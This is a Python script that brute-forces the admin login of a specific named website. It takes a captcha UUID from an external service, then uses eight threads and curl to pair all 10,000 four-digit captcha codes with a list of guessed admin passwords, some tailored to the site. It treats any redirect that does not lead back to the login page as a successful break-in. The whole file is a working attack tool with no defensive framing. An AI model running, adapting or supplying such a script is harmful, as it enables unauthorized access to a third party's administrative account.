import subprocess, json, threading, sys

# Get UUID from external captcha API
r = subprocess.run(["curl","-sk","https://api.myxypt.com/captcha?width=140&height=48"],
    capture_output=True, text=True, timeout=8)
d = json.loads(r.stdout)
UUID = d["data"]["uuid"]
print("UUID:", UUID)

# Get session
subprocess.run(["curl","-sk","-c","/tmp/chin_bf.txt",
    "http://chinanaisi.com/admin/login","-o","/dev/null"], timeout=5)

# Passwords to try
passwords = ["admin123","admin","admin888","123456","password","chinanaisi","chinanaisi123",
             "12345678","admin666","hongguanjixie","naisi","naisi123"]

found = threading.Event()
result = [None]

def try_range(start, end):
    if found.is_set(): return
    for i in range(start, end):
        if found.is_set(): return
        code = "%04d" % i
        for pw in passwords:
            r = subprocess.run(["curl","-sk","-b","/tmp/chin_bf.txt",
                "http://chinanaisi.com/admin/login.php","-X","POST",
                "-d", "action=loginpost&uuid=%s&loginId=&username=admin&password=%s&checkcode=%s" % (UUID, pw, code),
                "-H","X-Requested-With: XMLHttpRequest",
                "-A","Mozilla/5.0","-D","-","-o","/dev/null"],
                capture_output=True, text=True, timeout=5)
            loc = [l for l in r.stdout.split("\n") if "Location:" in l]
            # Success = redirect NOT to /admin/login.php
            if not loc or "/admin/login.php" not in str(loc):
                print(">>> HIT: admin/%s code=%s <<<" % (pw, code))
                result[0] = (pw, code)
                found.set()
                return
        if i % 200 == 0:
            print("  %04d/%d" % (i, end), file=sys.stderr)

# 8 threads
threads = []
chunk = 1250
for t in range(8):
    th = threading.Thread(target=try_range, args=(t*chunk, (t+1)*chunk))
    th.start()
    threads.append(th)

for th in threads:
    th.join()

if result[0]:
    print("SUCCESS:", result[0])
else:
    print("All 10000 codes tried, no hit")
